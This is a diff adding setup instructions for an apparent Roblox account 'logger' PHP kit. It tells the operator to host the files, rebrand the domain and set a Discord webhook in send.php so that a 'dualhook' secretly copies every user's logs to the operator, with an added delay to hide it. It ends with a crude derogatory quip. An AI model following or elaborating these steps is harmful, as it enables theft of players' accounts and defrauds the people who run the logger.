@@ -1,0 +1,15 @@
+1. Get a webspace
+2. Create a database named "rblxapi"
+3. Upload or load the rblxapi.sql file
+4. Change the database settings (servername, username, password) in api.php, create.php & send.php
+5. Change all domains in the files from rblx-trade.com/rblxapi/ to your domain (or subdomain) & path (you can remove the folder "rblxapi", looks better if you do)
+6. Go to send.php and change the value of $yourwebhook to your discord webhook, this is where the dualhook happens! The users & you get the same logs.
+7. Enjoy - icorex just saved $75!
+
+Also, I recreated the send.php file, added more & better stuff, added delay (sleep function) so there's a little delay for the users who use
+your logger. You can change the delay however you want (in seconds).
+
+credits to icorex only because he had to recreate send.php & the database :(
+
+
+-- mysqli is gay
